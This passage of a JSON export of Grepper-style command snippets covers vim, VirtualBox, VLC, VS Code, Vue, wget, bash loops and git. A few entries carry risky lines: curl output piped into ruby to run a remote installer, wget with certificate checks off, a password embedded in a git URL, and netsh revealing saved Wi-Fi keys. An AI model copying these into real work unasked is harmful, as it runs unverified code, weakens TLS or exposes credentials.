    "description": "set tabstop=4 \n:set tabstop=2 shiftwidth=2 expandtab :retab  # tabstop\t\t-> Indentation width in spaces # shiftwidth\t-> Autoindentation width in spaces # expandtab\t\t-> Use actual spaces instead of tabs # retab\t\t\t-> Convert existing tabs to spaces\nset shiftwidth=0 set tabstop=4\n",
    "reg_date": "2021-10-11T22:13:17.000Z"
  },
  {
    "id": 4943,
    "keyword": null,
    "link": null,
    "title": " vim shuffle lines of file",
    "description": "shuf myfile.txt > myfile_shuffled.txt\n",
    "reg_date": "2021-10-11T22:13:17.000Z"
  },
  {
    "id": 4944,
    "keyword": null,
    "link": null,
    "title": " vim tab 2 spaces",
    "description": "set smartindent set tabstop=2 set expandtab set shiftwidth=2\n",
    "reg_date": "2021-10-11T22:13:17.000Z"
  },
  {
    "id": 4945,
    "keyword": null,
    "link": null,
    "title": " vim ubuntu install",
    "description": "#Ubuntu or Debian sudo apt install -y vim\n",
    "reg_date": "2021-10-11T22:13:17.000Z"
  },
  {
    "id": 4946,
    "keyword": null,
    "link": null,
    "title": " virtualbox homebrew",
    "description": "$ brew cask install virtualbox\n$ brew cask install vagrant\n",
    "reg_date": "2021-10-11T22:13:18.000Z"
  },
  {
    "id": 4947,
    "keyword": null,
    "link": null,
    "title": " virtualbox in ubuntu 20.04",
    "description": "# install oracle Virtualbox in Ubuntu 20.04 sudo apt update sudo apt install virtualbox virtualbox-ext-pack\n",
    "reg_date": "2021-10-11T22:13:18.000Z"
  },
  {
    "id": 4948,
    "keyword": null,
    "link": null,
    "title": " virtualbox mac install brew",
    "description": "$ brew cask install virtualbox\n",
    "reg_date": "2021-10-11T22:13:18.000Z"
  },
  {
    "id": 4949,
    "keyword": null,
    "link": null,
    "title": " virtualbox ubuntu usb not detected",
    "description": "sudo adduser $USER vboxusers  #after restart virtual machine\n",
    "reg_date": "2021-10-11T22:13:18.000Z"
  },
  {
    "id": 4950,
    "keyword": null,
    "link": null,
    "title": " virtualenvwrapper",
    "description": "$ pip install virtualenv $ pip install virtualenvwrapper  // Append ~/.bashrc export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3 export WORKON_HOME=$HOME/.virtualenvs export VIRTUALENVWRAPPER_VIRTUALENV=/$HOME/.local/bin/virtualenv source ~/.local/bin/virtualenvwrapper.sh\n$ pip install virtualenvwrapper ... $ export WORKON_HOME=~/Envs $ mkdir -p $WORKON_HOME $ source /usr/local/bin/virtualenvwrapper.sh $ mkvirtualenv env1 Installing setuptools.......................................... .................................................... .................................................... ...............................done. virtualenvwrapper.user_scripts Creating /Users/dhellmann/Envs/env1/bin/predeactivate virtualenvwrapper.user_scripts Creating /Users/dhellmann/Envs/env1/bin/postdeactivate virtualenvwrapper.user_scripts Creating /Users/dhellmann/Envs/env1/bin/preactivate virtualenvwrapper.user_scripts Creating /Users/dhellmann/Envs/env1/bin/postactivate  New python executable in env1/bin/python (env1)$ ls $WORKON_HOME env1 hook.log \n# install Virtual Environment alternative to virtualenv pip install virtualenvwrapper  # modify your .profile file # find out where virtualenvwrapper.sh file is by issuing which command # source it as shown below source /usr/local/bin/virtualenvwrapper.sh  # setup an environment mkvirtualenv dev_env1 mkvirtualenv dev_env2 mkvirtualenv dev_env3 mkvirtualenv dev_env4  # create list of your projects, project1...projectN mkproject project1 mkproject -p python3 project2  # this project is for python 3 only mkproject project3 mkproject projectN  # go to the folder where you have cloned an existing repo # and run the command to bind that project to this environment setvirtualenvproject  # get list of all environments workon  # choose a project to work on based on previous output # say you have dev_env1, dev_env2, dev_env3... dev_envN # state the name of the project to work on  workon dev_env1  # other tasks # remove un-needed environments rmvirtualenv dev_env4  # build a temp environment if needed mktempenv  # .profile needs this variables set for export # i.e. export WORKON_HOME=\"/home/rajib2k5/envs\" #      export PROJECT_HOME=\"/home/rajib2k5/dev\"  # in order to leave an environment, run the command below  deactivate\n",
    "reg_date": "2021-10-11T22:13:18.000Z"
  },
  {
    "id": 4951,
    "keyword": null,
    "link": null,
    "title": " visual studio code",
    "description": "bruh these grepper results are hilarious xD\nwise choice young master\ngood job. you have joined the crusade of coders.\nMay the .code be with you...\n#install visual studio code from bash sudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\"\ni tell you... this editor is LIT \nA powerful ide that can be used to program in most of the popular languages. You can use it for HTML, CSS, JavaScript, PHP, Python, C++, Visual Basic, C# and probably many other that i didn't mention\nYou wanna handle heavy weight code with light weight editor! Smart Guy\nVery wise choice fellow coder! Good luck :)\nI dont use vsc, except for arduino. use jetbrains IDEs for everything else!\n",
    "reg_date": "2021-10-11T22:13:18.000Z"
  },
  {
    "id": 4952,
    "keyword": null,
    "link": null,
    "title": " visualize git tree branches in repo",
    "description": "gitk #this shows the active branch tree gitk --all #this shows your entire branch typology #This opens the git GUI with a diagram of the repo's branch typology as well as # other GUI functions.\n",
    "reg_date": "2021-10-11T22:13:19.000Z"
  },
  {
    "id": 4953,
    "keyword": null,
    "link": null,
    "title": " vlc debian",
    "description": "sudo apt install vlc\n",
    "reg_date": "2021-10-11T22:13:19.000Z"
  },
  {
    "id": 4954,
    "keyword": null,
    "link": null,
    "title": " vlc download for linux",
    "description": "% sudo snap install vlc \nsudo apt-get install vlc libxvidcore4 libfaac0  # libxvidcore4 libfaac0 are for MPEG-4\nsudo apt install vlc\n",
    "reg_date": "2021-10-11T22:13:19.000Z"
  },
  {
    "id": 4955,
    "keyword": null,
    "link": null,
    "title": " vlc install linux",
    "description": "sudo apt-get install vlc libxvidcore4 libfaac0  # libxvidcore4 libfaac0 are for MPEG-4\nsudo apt install vlc\n",
    "reg_date": "2021-10-11T22:13:19.000Z"
  },
  {
    "id": 4956,
    "keyword": null,
    "link": null,
    "title": " vlc linux",
    "description": "# Ubuntu 20.04 upwards sudo apt install snapd sudo snap install vlc\n% sudo snap install vlc \nsudo apt-get install vlc libxvidcore4 libfaac0  # libxvidcore4 libfaac0 are for MPEG-4\nsudo apt install vlc\n",
    "reg_date": "2021-10-11T22:13:19.000Z"
  },
  {
    "id": 4957,
    "keyword": null,
    "link": null,
    "title": " vlc ubuntu",
    "description": "# Ubuntu 20.04 upwards sudo apt install snapd sudo snap install vlc\nsudo apt install vlc\n% sudo snap install vlc \nsudo apt install vlc \n% sudo snap install vlc\nsudo snap install vlc\n",
    "reg_date": "2021-10-11T22:13:19.000Z"
  },
  {
    "id": 4958,
    "keyword": null,
    "link": null,
    "title": " vmplayer kernel headers not found",
    "description": "# Using pacman sudo pacman -S linux-headers # Using apt sudo apt install linux-headers\n",
    "reg_date": "2021-10-11T22:13:19.000Z"
  },
  {
    "id": 4959,
    "keyword": null,
    "link": null,
    "title": " vmware workstation merge vmdk files",
    "description": "\"C:\\Program Files (x86)\\VMware\\VMware Workstation\\vmware-vdiskmanager.exe\" -r \"D:\\Virtual Machines\\Windows 7 x64\\Windows 7 x64.vmdk\" -t 0 \"D:\\Windows7.vmdk\"\n",
    "reg_date": "2021-10-11T22:13:20.000Z"
  },
  {
    "id": 4960,
    "keyword": null,
    "link": null,
    "title": " vncserver kali linux",
    "description": "sudo apt-get install tightvncserver -y\n",
    "reg_date": "2021-10-11T22:13:20.000Z"
  },
  {
    "id": 4961,
    "keyword": null,
    "link": null,
    "title": " vncviewer display 0",
    "description": "vncserver -display :0 \n",
    "reg_date": "2021-10-11T22:13:20.000Z"
  },
  {
    "id": 4962,
    "keyword": null,
    "link": null,
    "title": " vs code list all extensions",
    "description": "code --list-extensions | % { \"code --install-extension $_\" } \ncode --list-extensions\n",
    "reg_date": "2021-10-11T22:13:20.000Z"
  },
  {
    "id": 4963,
    "keyword": null,
    "link": null,
    "title": " vs code set ubuntu wsl as default terminal",
    "description": "- Go to vs code > settings.json - Replaces \"terminal.integrated.shell.windows\" with:  { \"terminal.integrated.shell.windows\": \"C:\\\\WINDOWS\\\\System32\\\\wsl.exe\", }\n",
    "reg_date": "2021-10-11T22:13:21.000Z"
  },
  {
    "id": 4964,
    "keyword": null,
    "link": null,
    "title": " vs force restore all packages command line",
    "description": "Update-Package -reinstall\n",
    "reg_date": "2021-10-11T22:13:21.000Z"
  },
  {
    "id": 4965,
    "keyword": null,
    "link": null,
    "title": " vscode Module 'cv2' has no 'imshow' member",
    "description": "This is from pylint. You can generate a pylint config file in the root of your project with this command:   pylint --generate-rcfile > .pylintrc  Add cv2 so you end up with  # A comma-separated list of package or module names from where C extensions may # be loaded. Extensions are loading into the active Python interpreter and may # run arbitrary code. extension-pkg-whitelist=cv2  Save the file. The lint errors should disappear.\n",
    "reg_date": "2021-10-11T22:13:21.000Z"
  },
  {
    "id": 4966,
    "keyword": null,
    "link": null,
    "title": " vscode c# run in terminal",
    "description": "# Run the following command in the Terminal: dotnet run  # The program displays \"Hello World!\" and ends. C:\\Projects\\HelloWorld> dotnet run Hello World!\n",
    "reg_date": "2021-10-11T22:13:21.000Z"
  },
  {
    "id": 4967,
    "keyword": null,
    "link": null,
    "title": " vscode disable powershell integrated console",
    "description": "// vscode user settings PowerShell Integrated Console Show On Startup\n",
    "reg_date": "2021-10-11T22:13:21.000Z"
  },
  {
    "id": 4968,
    "keyword": null,
    "link": null,
    "title": " vscode for ubuntu linux",
    "description": "wget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add - sudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\" sudo apt update sudo apt install code\nsudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\"\n",
    "reg_date": "2021-10-11T22:13:22.000Z"
  },
  {
    "id": 4969,
    "keyword": null,
    "link": null,
    "title": " vscode give music permissions",
    "description": "#Run this in vscode: #!/bin/bash osascript <<EOD   tell application \"Music\"       next track       play   end tell\n",
    "reg_date": "2021-10-11T22:13:22.000Z"
  },
  {
    "id": 4970,
    "keyword": null,
    "link": null,
    "title": " vscode install-extension command line",
    "description": "code --list-extensions code --install-extension ms-vscode.cpptools code --uninstall-extension ms-vscode.csharp \ncode --install-extension myextension.vsix\n",
    "reg_date": "2021-10-11T22:13:22.000Z"
  },
  {
    "id": 4971,
    "keyword": null,
    "link": null,
    "title": " vscode save git credentials",
    "description": "git remote set-url origin https://<USERNAME>:<PASSWORD>@bitbucket.org/path/to/repo.git\n",
    "reg_date": "2021-10-11T22:13:22.000Z"
  },
  {
    "id": 4972,
    "keyword": null,
    "link": null,
    "title": " vue-cli-service not found",
    "description": "sudo npm install -g @vue/cli@latest \n",
    "reg_date": "2021-10-11T22:13:22.000Z"
  },
  {
    "id": 4973,
    "keyword": null,
    "link": null,
    "title": " vue-cli-service not found ubuntu",
    "description": "npm i @vue/cli-service \nsudo npm install -g @vue/cli@latest \n",
    "reg_date": "2021-10-11T22:13:22.000Z"
  },
  {
    "id": 4974,
    "keyword": null,
    "link": null,
    "title": " vue cli",
    "description": "npm install -g @vue/cli # OR yarn global add @vue/cli \nnpm install -g @vue/cli //then vue create hello-world\nnpm install -g vue-cli    //make sure you have node and npm installed  vue init webpack <appname>  //  eg:  vue init webpack myapp cd <appname>               // cd myapp npm install npm run dev  //server will start in port 8080\nvue create my-project # OR vue ui \ninstalling vue cli commands npm install --global vue-cli is now npm install -g @vue/cli\n",
    "reg_date": "2021-10-11T22:13:22.000Z"
  },
  {
    "id": 4975,
    "keyword": null,
    "link": null,
    "title": " vue cli upgrade",
    "description": "npm update -g @vue/cli # OR yarn global upgrade --latest @vue/cli\n",
    "reg_date": "2021-10-11T22:13:22.000Z"
  },
  {
    "id": 4976,
    "keyword": null,
    "link": null,
    "title": " vue install",
    "description": "npm install -g @vue/cli # OR yarn global add @vue/cli\n/*for development ===>*/ <script src=\"https://cdn.jsdelivr.net/npm/vue/dist/vue.js\"></script> /*for production ===>*/ <script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.11\"></script> \nnpm install -g vue-cli    //make sure you have node and npm installed  vue init webpack <appname>  //  eg:  vue init webpack myapp cd <appname>               // cd myapp npm install npm run dev  //server will start in port 8080\nnpm install -g @vue/cli    yarn global add @vue/cli\n<script src=\"https://unpkg.com/vue@next\"></script> # CDN Version  # NPM or Yarn Version npm install vue@next  #Vue 3 CLI Installation yarn global add @vue/cli # OR npm install -g @vue/cli  # Vue CLI Create Project vue create my-project\n",
    "reg_date": "2021-10-11T22:13:23.000Z"
  },
  {
    "id": 4977,
    "keyword": null,
    "link": null,
    "title": " vue scss",
    "description": "npm install sass-loader node-sass style-loader --save-dev   \n// in terminal // If you use npm npm install sass-loader node-sass --save-dev // If you use yarn  yarn add sass-loader node-sass  // In your component <style lang=\"scss\">   // ... </style>\nnpm i node-sass sass-loader  // create the path: styles/main.scss in your src directory &ndash;src   |&ndash;&ndash;styles   |&ndash;&ndash;main.scss  // add this to your vue.config.js file in the root directory module.exports = {   css: {     loaderOptions: {       sass: {         prependData: `@import \"@/styles/_variables.scss\";`       }     }   } };\n# /!\\ if you work with vue@2.6.12, it seems sass-loader@11.0.0 doesn't work # So, in terminal: yarn add node-sass sass-loader@10.1.1\n<style lang=\"scss\"> /* write SCSS here */ </style>\n",
    "reg_date": "2021-10-11T22:13:23.000Z"
  },
  {
    "id": 4978,
    "keyword": null,
    "link": null,
    "title": " vuejs sass Syntax Error: TypeError: this.getOptions is not a function",
    "description": "# It seems like sass-loader@11.0.0 doesn't work with vue@2.6.12.  # I installed sass-loader@10.1.1 and it worked like a charm again. # In terminal: yarn remove sass-loader yarn add sass-loader@10.1.1 yarn serve \n",
    "reg_date": "2021-10-11T22:13:23.000Z"
  },
  {
    "id": 4979,
    "keyword": null,
    "link": null,
    "title": " vuex install",
    "description": "npm install vuex --save  // then in your store.js import Vue from 'vue' import Vuex from 'vuex'  Vue.use(Vuex);\nnpm install vuex --save \n$ npm install vue vuex @vuex-orm/core --save \nimport Vue from 'vue' import Vuex from 'vuex'  Vue.use(Vuex) \n",
    "reg_date": "2021-10-11T22:13:23.000Z"
  },
  {
    "id": 4980,
    "keyword": null,
    "link": null,
    "title": " w: some index files failed to download kali linux",
    "description": "",
    "reg_date": "2021-10-11T22:13:23.000Z"
  },
  {
    "id": 4981,
    "keyword": null,
    "link": null,
    "title": " wait command bash",
    "description": "sleep NUMBER[SUFFIX]\t#Just use this command structure to wait/sleep #Example: sleep 5m\t#sleeps 5 minutes sleep 0.1\t\t#sleeps 0.1 seconds or 100 miliseconds #Suffixes s - seconds (default) m - minutes h - hours d - days When no suffix is specified, it defaults to seconds.\n",
    "reg_date": "2021-10-11T22:13:23.000Z"
  },
  {
    "id": 4982,
    "keyword": null,
    "link": null,
    "title": " wait n seconds in shell script",
    "description": "sleep .5 # Waits 0.5 second. sleep 5  # Waits 5 seconds. sleep 5s # Waits 5 seconds. sleep 5m # Waits 5 minutes. sleep 5h # Waits 5 hours. sleep 5d # Waits 5 days.\n",
    "reg_date": "2021-10-11T22:13:23.000Z"
  },
  {
    "id": 4983,
    "keyword": null,
    "link": null,
    "title": " watch nvidia smi",
    "description": "nvidia-smi -l 1 \nwatch -n 1 nvidia-smi\n",
    "reg_date": "2021-10-11T22:13:24.000Z"
  },
  {
    "id": 4984,
    "keyword": null,
    "link": null,
    "title": " webpack-dev-server command not found",
    "description": "npm install webpack-dev-server -g \n\"scripts\": {   \"start:dev\": \"webpack-dev-server\" }\nnode_modules/.bin/webpack-dev-server\n",
    "reg_date": "2021-10-11T22:13:24.000Z"
  },
  {
    "id": 4985,
    "keyword": null,
    "link": null,
    "title": " webpack install",
    "description": "npm install --save-dev webpack # or specific version npm install --save-dev webpack@<version>\nnpm install --save-dev webpack-cli\nnpm install --save-dev webpack\nnpm install webpack webpack-cli --save-dev\nyarn add webpack --dev\n",
    "reg_date": "2021-10-11T22:13:24.000Z"
  },
  {
    "id": 4986,
    "keyword": null,
    "link": null,
    "title": " webull on arch linux",
    "description": "unofrtunately nope only works for debian based. you can  try converting the package it will launch but nothing will happen with wine it will work but very prone to crashing and log in doesnt work  but thats with bare minumium installed so if you know more wine you can try\n",
    "reg_date": "2021-10-11T22:13:24.000Z"
  },
  {
    "id": 4987,
    "keyword": null,
    "link": null,
    "title": " wget adminer",
    "description": "# get latest english version for mysql only, save as adminer.php: wget https://www.adminer.org/latest-mysql-en.php -O adminer.php\nwget https://www.adminer.org/latest-en.php \n",
    "reg_date": "2021-10-11T22:13:24.000Z"
  },
  {
    "id": 4988,
    "keyword": null,
    "link": null,
    "title": " wget clone entire website",
    "description": "wget -mkEpnp http://example.org \n",
    "reg_date": "2021-10-11T22:13:24.000Z"
  },
  {
    "id": 4989,
    "keyword": null,
    "link": null,
    "title": " wget command not found mac",
    "description": "# /usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\" # brew install wget\n",
    "reg_date": "2021-10-11T22:13:24.000Z"
  },
  {
    "id": 4990,
    "keyword": null,
    "link": null,
    "title": " wget download website for offline viewing",
    "description": "wget -mkEpnp http://example.org \n",
    "reg_date": "2021-10-11T22:13:24.000Z"
  },
  {
    "id": 4991,
    "keyword": null,
    "link": null,
    "title": " wget files matching pattern",
    "description": "# Getting http://some/site/*my_pattern* SITE=\"http://some/site/\" PATTERN=\"my_pattern\" wget -nv -O- $SITE |    grep $PATTERN |      awk -v pat=$PATTERN -F '\"' '{ for (i=1; i<=NF; ++i) { if ($i ~ pat) print $i } }' |       while read x; do        \tif [[ ! $x = \">\" ]] ; then       \t  wget $SITE$x &>/dev/null       \t  echo $x       \tfi\n",
    "reg_date": "2021-10-11T22:13:25.000Z"
  },
  {
    "id": 4992,
    "keyword": null,
    "link": null,
    "title": " wget files matching regex",
    "description": "# Getting http://some/site/*my_pattern* SITE=\"http://some/site/\" PATTERN=\"my_pattern\" wget -nv -O- $SITE |    grep $PATTERN |      awk -v pat=$PATTERN -F '\"' '{ for (i=1; i<=NF; ++i) { if ($i ~ pat) print $i } }' |       while read x; do        \tif [[ ! $x = \">\" ]] ; then       \t  wget $SITE$x &>/dev/null       \t  echo $x       \tfi\n",
    "reg_date": "2021-10-11T22:13:25.000Z"
  },
  {
    "id": 4993,
    "keyword": null,
    "link": null,
    "title": " wget ignore ssl cert error",
    "description": "wget --no-check-certificate \"https://myPath/myFile.xlsx\"\n",
    "reg_date": "2021-10-11T22:13:25.000Z"
  },
  {
    "id": 4994,
    "keyword": null,
    "link": null,
    "title": " wget pause download",
    "description": "wget some_random_archive_file.zip  //to pause - ctrl + c  //to resume -   wget -c some_random_archive_file.zip\n",
    "reg_date": "2021-10-11T22:13:25.000Z"
  },
  {
    "id": 4995,
    "keyword": null,
    "link": null,
    "title": " wget typo3 9",
    "description": "wget https://get.typo3.org/9.5 -O 9.5.24.tar.gz\nwget https://get.typo3.org/8.7 -O 8.7.32.tar.gz\n",
    "reg_date": "2021-10-11T22:13:25.000Z"
  },
  {
    "id": 4996,
    "keyword": null,
    "link": null,
    "title": " what brach am i in git",
    "description": "git branch --show-current\n",
    "reg_date": "2021-10-11T22:13:25.000Z"
  },
  {
    "id": 4997,
    "keyword": null,
    "link": null,
    "title": " what branch git",
    "description": "git branch --show-current\n",
    "reg_date": "2021-10-11T22:13:25.000Z"
  },
  {
    "id": 4998,
    "keyword": null,
    "link": null,
    "title": " what command do you use to pull any changes from the master repository into your local repository?",
    "description": "git fetch <remote> <branch>\n",
    "reg_date": "2021-10-11T22:13:25.000Z"
  },
  {
    "id": 4999,
    "keyword": null,
    "link": null,
    "title": " what does virtual assistants do?",
    "description": "$ pip install virtualenv $ pip install virtualenvwrapper  // Append ~/.bashrc export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3 export WORKON_HOME=$HOME/.virtualenvs export VIRTUALENVWRAPPER_VIRTUALENV=/$HOME/.local/bin/virtualenv source ~/.local/bin/virtualenvwrapper.sh\nA virtual assistant just do two things >>>   listening....   speaking....      you can make a virtualassistant either with JS or Python >>>          in python you have to install some pakages, But in JS     you just have type nothing to install\n",
    "reg_date": "2021-10-11T22:13:26.000Z"
  },
  {
    "id": 5000,
    "keyword": null,
    "link": null,
    "title": " what if there is no run option for a .run file in ubuntu",
    "description": "$ sudo chmod +x ./FILENAME.run $ ./FILENAME.run\n",
    "reg_date": "2021-10-11T22:13:26.000Z"
  },
  {
    "id": 5001,
    "keyword": null,
    "link": null,
    "title": " what is --use-feature=2020-resolver",
    "description": "python -m pip install --upgrade pip \npip install example --use-feature=2020-resolver \n",
    "reg_date": "2021-10-11T22:13:26.000Z"
  },
  {
    "id": 5002,
    "keyword": null,
    "link": null,
    "title": " what is forking in git",
    "description": "Fork is a process to copy someone's or others repositories into our's or any account we have access to.\nGitHub fork Featured snippet from the web A fork is a copy of a repository. Forking a repository allows you to freely experiment with changes without affecting the original project. Most commonly, forks are used to either propose changes to someone else's project or to use someone else's project as a starting point for your own idea.\n",
    "reg_date": "2021-10-11T22:13:26.000Z"
  },
  {
    "id": 5003,
    "keyword": null,
    "link": null,
    "title": " what is meant by valence shell",
    "description": "the outermost shell of an atom containing the valence electrons.\n",
    "reg_date": "2021-10-11T22:13:26.000Z"
  },
  {
    "id": 5004,
    "keyword": null,
    "link": null,
    "title": " what is my gnome shell version",
    "description": "gnome-shell --version \n",
    "reg_date": "2021-10-11T22:13:26.000Z"
  },
  {
    "id": 5005,
    "keyword": null,
    "link": null,
    "title": " what process consuming RAM",
    "description": "ps -o pid,user,%mem,command ax | sort -b -k3 -r\n",
    "reg_date": "2021-10-11T22:13:27.000Z"
  },
  {
    "id": 5006,
    "keyword": null,
    "link": null,
    "title": " whatsapp download linux",
    "description": "sudo snap install whatsdesk\n",
    "reg_date": "2021-10-11T22:13:27.000Z"
  },
  {
    "id": 5007,
    "keyword": null,
    "link": null,
    "title": " whatsdesk",
    "description": "sudo snap install whatsdesk\n",
    "reg_date": "2021-10-11T22:13:27.000Z"
  },
  {
    "id": 5008,
    "keyword": null,
    "link": null,
    "title": " where is /dev/kvm",
    "description": "first install dependecies of kvm from android studio site then execute following command  Add your user to kvm group using: sudo adduser $USER kvm  If still showing permission denied: sudo chown $USER /dev/kvm\nThis is how I got it to work in Ubuntu 18.04  1. Install qemu-kvm $sudo apt install qemu-kvm  2. Add your user to kvm group using: $sudo adduser <Replace with username> kvm   3.If still showing permission denied: $ sudo chown <Replace with username> /dev/kvm  This works!\nTo check the ownership of /dev/kvm use  ls -al /dev/kvm The user was root, the group kvm. To check which users are in the kvm group, use  grep kvm /etc/group This returned  kvm:x:some_number: on my system: as there is nothing rightwards of the final :, there are no users in the kvm group.  To add your user to the kvm group, you could use  sudo adduser $USER kvm\n",
    "reg_date": "2021-10-11T22:13:27.000Z"
  },
  {
    "id": 5009,
    "keyword": null,
    "link": null,
    "title": " where is local dns file on windows",
    "description": "C:\\Windows\\System32\\Drivers\\etc\\hosts\n",
    "reg_date": "2021-10-11T22:13:27.000Z"
  },
  {
    "id": 5010,
    "keyword": null,
    "link": null,
    "title": " where is minecraft installed",
    "description": "Win+r %appdata%\\.  i really need a life help me...\n",
    "reg_date": "2021-10-11T22:13:27.000Z"
  },
  {
    "id": 5011,
    "keyword": null,
    "link": null,
    "title": " where is my .git config mac",
    "description": "vi $HOME/.gitconfig\n",
    "reg_date": "2021-10-11T22:13:27.000Z"
  },
  {
    "id": 5012,
    "keyword": null,
    "link": null,
    "title": " where is the crontab log",
    "description": "grep CRON /var/log/syslog\n",
    "reg_date": "2021-10-11T22:13:27.000Z"
  },
  {
    "id": 5013,
    "keyword": null,
    "link": null,
    "title": " where skype saves file in linux",
    "description": "# under this directory ~/snap/skype/common/.\n",
    "reg_date": "2021-10-11T22:13:28.000Z"
  },
  {
    "id": 5014,
    "keyword": null,
    "link": null,
    "title": " where to find github invites",
    "description": "go to https://github.com/username/reponame/invitations   #You can't see invitations from the home page (as of 04/2021) #Just go to <reponame>/invitations\n",
    "reg_date": "2021-10-11T22:13:28.000Z"
  },
  {
    "id": 5015,
    "keyword": null,
    "link": null,
    "title": " where to find the mac address from ipconfig /all",
    "description": "type on command -> ipconfig/all\n",
    "reg_date": "2021-10-11T22:13:28.000Z"
  },
  {
    "id": 5016,
    "keyword": null,
    "link": null,
    "title": " which desktop environment is runnings",
    "description": "$ echo $DESKTOP_SESSION\n",
    "reg_date": "2021-10-11T22:13:28.000Z"
  },
  {
    "id": 5017,
    "keyword": null,
    "link": null,
    "title": " which gpu do i have linux",
    "description": "sudo lshw -C display \nnvidia-smi \n",
    "reg_date": "2021-10-11T22:13:28.000Z"
  },
  {
    "id": 5018,
    "keyword": null,
    "link": null,
    "title": " which skype on ubuntu",
    "description": "sudo snap install skype --classic\n",
    "reg_date": "2021-10-11T22:13:28.000Z"
  },
  {
    "id": 5019,
    "keyword": null,
    "link": null,
    "title": " which user apache runs as ubntu",
    "description": "ps -ef | egrep '(httpd|apache2|apache)' | grep -v `whoami` | grep -v root | head -n1 | awk '{print $1}'\n",
    "reg_date": "2021-10-11T22:13:28.000Z"
  },
  {
    "id": 5020,
    "keyword": null,
    "link": null,
    "title": " which user of git on this project by cmd",
    "description": "git config user.name \n",
    "reg_date": "2021-10-11T22:13:28.000Z"
  },
  {
    "id": 5021,
    "keyword": null,
    "link": null,
    "title": " while loop bash",
    "description": "while true; do \t#code done\n#!/bin/sh INPUT_STRING=hello while [ \"$INPUT_STRING\" != \"bye\" ] do   echo \"Please type something in (bye to quit)\"   read INPUT_STRING   echo \"You typed: $INPUT_STRING\" done\n#!/bin/sh  a=0  while [ $a -lt 10 ] do    echo $a    a=`expr $a + 1` done\nwhile CONDITION_STATEMENT; do SOME_CODE; done\n# The syntax is as follows:  while [ condition ] do    command1    command2    command3 done  # command1 to command3 will be executed repeatedly till the 'condition' # is true. # The argument for a while loop can be any boolean expression. # Infinite loop occurs when the conditional never evaluates to false. # Here is the while loop for a one-liner syntax:  while [ condition ]; do commands; done while control-command; do COMMANDS; done  # For example, the following while loop will print 'welcome x times' 5 times # on the screen:    #!/bin/bash x=1 while [ $x -le 5 ] do   echo \"Welcome $x times\"   x=$(( $x + 1 )) done   # as one-liner: x=1; while [ $x -le 5 ]; do echo \"Welcome $x times\" $(( x++ )); done    # Here is a sample shell code to calculate factorial using while loop:    #!/bin/bash counter=$1 factorial=1 while [ $counter -gt 0 ] do    factorial=$(( $factorial * $counter ))    counter=$(( $counter - 1 )) done echo $factorial    # To run just type: $ chmod +x script.sh $ ./script.sh 5  \nwhile true; do \t#code ;done\n",
    "reg_date": "2021-10-11T22:13:29.000Z"
  },
  {
    "id": 5022,
    "keyword": null,
    "link": null,
    "title": " who am i linux command",
    "description": "whoami\n",
    "reg_date": "2021-10-11T22:13:29.000Z"
  },
  {
    "id": 5023,
    "keyword": null,
    "link": null,
    "title": " why i am not able to make a directory in htdocs folder in ubuntu",
    "description": "$sudo chmod -R 755 /opt/lampp/htdocs $whoami $sudo chown -R username:username /opt/lampp/htdocs\n",
    "reg_date": "2021-10-11T22:13:29.000Z"
  },
  {
    "id": 5024,
    "keyword": null,
    "link": null,
    "title": " why is merge removing gitingore",
    "description": "git rm --cached remove_file add file to gitignore git add .gitignore git commit -m \"Excluding\"\n",
    "reg_date": "2021-10-11T22:13:29.000Z"
  },
  {
    "id": 5025,
    "keyword": null,
    "link": null,
    "title": " why pyaudio is not installing",
    "description": "sudo apt-get install portaudio19-dev python-pyaudio\n\"\"\" If you are having trouble installing PyAudio on your mechine, pyaudio is a unofficial library, so you need to use pipwin to install and use PyAudio and if you don't know anything about pipwin no problem you may  watch this video: https://www.youtube.com/watch?v=-3am_5jMzJ4 \"\"\"\n",
    "reg_date": "2021-10-11T22:13:29.000Z"
  },
  {
    "id": 5026,
    "keyword": null,
    "link": null,
    "title": " widget tweaks django install",
    "description": "pip install django-widget-tweaks\n",
    "reg_date": "2021-10-11T22:13:29.000Z"
  },
  {
    "id": 5027,
    "keyword": null,
    "link": null,
    "title": " wifi adapter not detected ubuntu",
    "description": "# Run this and reboot sudo apt-get install --reinstall bcmwl-kernel-source\n",
    "reg_date": "2021-10-11T22:13:29.000Z"
  },
  {
    "id": 5028,
    "keyword": null,
    "link": null,
    "title": " wifi password in windows 10",
    "description": "NETSH WLAN SHOW PROFILE WIFI KEY=CLEAR \nnetsh wlan show profile name=WIFI-NAME key=clear\n",
    "reg_date": "2021-10-11T22:13:29.000Z"
  },
  {
    "id": 5029,
    "keyword": null,
    "link": null,
    "title": " win 10 battery report",
    "description": "powercfg /batteryreport\n",
    "reg_date": "2021-10-11T22:13:30.000Z"
  },
  {
    "id": 5030,
    "keyword": null,
    "link": null,
    "title": " window host file",
    "description": "C:\\Windows\\System32\\Drivers\\etc\\hosts\n",
    "reg_date": "2021-10-11T22:13:30.000Z"
  },
  {
    "id": 5031,
    "keyword": null,
    "link": null,
    "title": " windows-build-tools",
    "description": "# Open terminal as administrator yarn global add windows-build-tools # or npm install --global windows-build-tools\n",
    "reg_date": "2021-10-11T22:13:30.000Z"
  },
  {
    "id": 5032,
    "keyword": null,
    "link": null,
    "title": " windows 10 autostart folder location",
    "description": "#windows 10 autostart folder Path  #user specific:  %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup  #for ALL users (system-language  dependent):  %SYSTEMDRIVE%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\n",
    "reg_date": "2021-10-11T22:13:30.000Z"
  },
  {
    "id": 5033,
    "keyword": null,
    "link": null,
    "title": " windows 10 copy ssh key to server",
    "description": "type $env:USERPROFILE\\.ssh\\id_rsa.pub | ssh {IP-ADDRESS-OR-FQDN} \"cat >> .ssh/authorized_keys\" \nGet-Content ~/.ssh/id_rsa.pub | Set-Clipboard\n",
    "reg_date": "2021-10-11T22:13:30.000Z"
  },
  {
    "id": 5034,
    "keyword": null,
    "link": null,
    "title": " windows command turn off screen",
